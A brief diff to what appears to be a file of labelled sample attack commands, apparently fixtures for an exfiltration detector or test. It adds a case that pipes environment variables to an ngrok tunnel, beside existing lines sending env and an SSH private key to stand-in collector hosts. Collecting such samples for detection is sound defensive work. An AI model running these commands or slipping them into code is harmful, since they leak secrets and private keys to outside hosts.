@@ -10,3 +10,6 @@ env | curl -X POST --data-binary @- https://evil-collector.example.com/drop
 
 # Data exfiltration to a known throwaway webhook endpoint.
 cat ~/.ssh/id_rsa | curl -d @- https://webhook.site/abcd-1234-collect
+
+# Data exfiltration via an ngrok tunnel endpoint.
+env | curl -X POST --data-binary @- https://evil-collector.ngrok.io/collect
